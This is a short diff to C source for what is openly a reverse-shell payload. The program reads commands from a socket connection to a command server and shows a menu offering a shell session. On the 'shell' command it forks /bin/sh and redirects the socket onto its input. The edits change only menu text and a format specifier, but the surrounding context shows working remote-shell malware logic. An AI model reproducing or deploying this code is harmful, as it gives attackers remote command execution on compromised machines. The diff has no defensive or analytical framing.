@@ -31,7 +31,7 @@ int main(void){
 	while (connection_established == 0){
 		while((n = read(sockt, buffer, MAXBUF)) > 0){
 			if(strncmp(buffer, "help\n", 5) == 0){
-				char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\nexit - exits payload process\n\n";
+				char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\n!exit - exits back to command server\n\n";
 
 				write(sockt, help, strlen(help));
 			}
@@ -43,7 +43,7 @@ int main(void){
 				char *const argv[] = {"/bin/sh", NULL};
 				if((child_pid = fork()) == 0){
 					char shell_msg[50];
-					snprintf(shell_msg, 50, "\nReverse shell session started on PID %ld\n", getpid());
+					snprintf(shell_msg, 50, "\nReverse shell session started on PID %i\n", getpid());
 					write(sockt, shell_msg, strlen(shell_msg));
 
 					dup2(sockt, 0);
@@ -65,7 +65,7 @@ int main(void){
 			}
 
 			else{
-				char* invalid = "Invalid command session command, type \"help\" for a list of commands\n";		
+				char* invalid = "\nInvalid command session command, type \"help\" for a list of commands\n";
 				write(sockt, invalid, strlen(invalid));
 			}		
 		}
